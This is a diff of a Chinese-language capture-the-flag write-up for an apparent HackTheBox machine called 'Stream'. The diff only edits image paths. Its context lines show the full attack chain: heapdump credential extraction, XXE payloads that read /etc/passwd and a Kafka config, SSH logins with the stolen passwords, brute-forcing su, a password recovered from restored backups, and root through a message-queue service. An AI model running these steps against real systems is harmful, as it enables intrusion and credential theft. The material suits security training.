@@ -25,7 +25,7 @@ Stream 是一台机场数据链路主题的 Linux 机器：表面只有三个端
 nmap -Pn -p 22,80,8081 -sV -sC --version-light 10.129.205.228
 ```
 
-![1](../../stream/01-nmap.png)
+![1](/stream/01-nmap.png)
 
 - `80`：nginx，根路径 301 到 `http://api.htb-airport.htb/`
 - `8081`：Uvicorn（FastAPI），即 AIDX 航班数据摄入 API
@@ -37,7 +37,7 @@ curl -s http://10.129.205.228/ -H 'Host: api.htb-airport.htb'
 curl -s http://10.129.205.228/ -H 'Host: db.htb-airport.htb'
 ```
 
-![2](../../stream/02-vhost-actuator.png)
+![2](/stream/02-vhost-actuator.png)
 
 `api` 是一个 Spring Boot 网关（`terminal-edge-gateway`），`/actuator` 只暴露了一个端点：`heapdump`。`db` 返回 4 字节的 `Ok.`，是 ClickHouse 的 HTTP 接口（默认 8123，被反代到 80）。
 
@@ -56,7 +56,7 @@ heap 里以明文字符串保存着数据源配置。用 `strings` 粗筛就能�
 strings -n 6 heap.bin | grep -iE 'svc_events|CREATE USER|clickhouse' | sort -u
 ```
 
-![3](../../stream/03-heapdump.png)
+![3](/stream/03-heapdump.png)
 
 拿到 `svc_events / Yl4aCgh4y2PnU`。堆里还留着初始化 SQL：
 
@@ -74,7 +74,7 @@ curl -s "$CH" -H 'Host: db.htb-airport.htb' --data-binary 'SELECT currentUser(),
 curl -s "$CH" -H 'Host: db.htb-airport.htb' --data-binary 'SHOW TABLES FROM partner_feed'
 ```
 
-![4](../../stream/04-clickhouse.png)
+![4](/stream/04-clickhouse.png)
 
 库 `partner_feed` 里是一条完整的 AIDX 数据管道：
 
@@ -117,7 +117,7 @@ curl -s -X POST http://10.129.205.228:8081/feeds/aidx \
   -H 'Content-Type: application/xml' --data-binary @xxe_passwd2.xml
 ```
 
-![5](../../stream/05-xxe-post.png)
+![5](/stream/05-xxe-post.png)
 
 实体展开的结果会随解析后的 JSON 落进 `flightleg_json`，用 `transaction_id` 取回来：
 
@@ -126,7 +126,7 @@ curl -s "$CH" -H 'Host: db.htb-airport.htb' --data-binary \
   "SELECT event FROM partner_feed.flightleg_json WHERE transaction_id='xxe-passwd-2' FORMAT Vertical"
 ```
 
-![6](../../stream/06-passwd.png)
+![6](/stream/06-passwd.png)
 
 `svc-infra` 与 `martin_cole` 两个交互用户确认存在。
 
@@ -136,7 +136,7 @@ curl -s "$CH" -H 'Host: db.htb-airport.htb' --data-binary \
 <!ENTITY xxe SYSTEM "file:///opt/kafka_2.13-4.3.1/config/server.properties">
 ```
 
-![7](../../stream/07-kafka-creds.png)
+![7](/stream/07-kafka-creds.png)
 
 ```text
 user_svc_infra="Ny2hdpme$bwT3"
@@ -150,7 +150,7 @@ user_svc_infra="Ny2hdpme$bwT3"
 sshpass -p 'Ny2hdpme$bwT3' ssh svc-infra@10.129.205.228 'id; hostname; ls -la /home'
 ```
 
-![8](../../stream/08-ssh-svcinfra.png)
+![8](/stream/08-ssh-svcinfra.png)
 
 `svc-infra` 没有 sudo 权限，`martin_cole` 的家目录是 `750`，读不到。机器上没有配置 `pam_faillock` / `pam_tally2`，可以放心爆破 `su`。
 
@@ -183,7 +183,7 @@ ok = os.WIFEXITED(status) and os.WEXITSTATUS(status) == 0
 sshpass -p tinkerbell ssh martin_cole@10.129.205.228 'id; hostname; cat ~/user.txt'
 ```
 
-![9](../../stream/10-user-flag.png)
+![9](/stream/10-user-flag.png)
 
 ```text
 c27cfc5739be454d3e7813328********
@@ -198,7 +198,7 @@ kopia repository status
 kopia snapshot list --all
 ```
 
-![11](../../stream/11-kopia-status.png)
+![11](/stream/11-kopia-status.png)
 
 仓库里是 `ch-logs` 快照（ClickHouse 日志，快照 ID `kc43a7ec76aeac204b305df2b777304d1`）。恢复到 `/tmp` 后翻日志：
 
@@ -207,7 +207,7 @@ kopia snapshot restore kc43a7ec76aeac204b305df2b777304d1 /tmp/restore
 grep -rniE 'ALTER USER|password' /tmp/restore | head
 ```
 
-![12](../../stream/12-kopia-restore.png)
+![12](/stream/12-kopia-restore.png)
 
 历史错误日志里留下了默认用户的改密语句（当时手滑少打了一个引号，整条查询作为语法错误被完整记进了 `clickhouse-server.err.log`）：
 
@@ -226,7 +226,7 @@ systemctl cat aidx-dlq-drainer.service
 cat /opt/ops/dlq_drainer.py
 ```
 
-![13](../../stream/13-dlq-drainer.png)
+![13](/stream/13-dlq-drainer.png)
 
 关键几行：
 
@@ -253,7 +253,7 @@ CHD='http://10.129.205.228/?user=default&password=N3v3rs33nD4T4'
 curl -s "$CHD" -H 'Host: db.htb-airport.htb' --data-binary @fmt_write.sql
 ```
 
-![14](../../stream/14-write-formatter.png)
+![14](/stream/14-write-formatter.png)
 
 然后往 DLQ 里投一条消息：向摄入接口发一段“标签齐全但 XML 不合法”的 body，摄入层只做子串检查会放行，解析 worker 失败后自动送进 `aidx.flightleg.dlq.v1`：
 
@@ -269,7 +269,7 @@ printf '<IATA_AIDX_FlightLegNotifRQ><Originator/><FlightLeg><LegIdentifier></IAT
 cat /tmp/root.txt
 ```
 
-![15](../../stream/15-root-flag.png)
+![15](/stream/15-root-flag.png)
 
 ```text
 954f3b2d4a9244c40d09e8f2bb604415
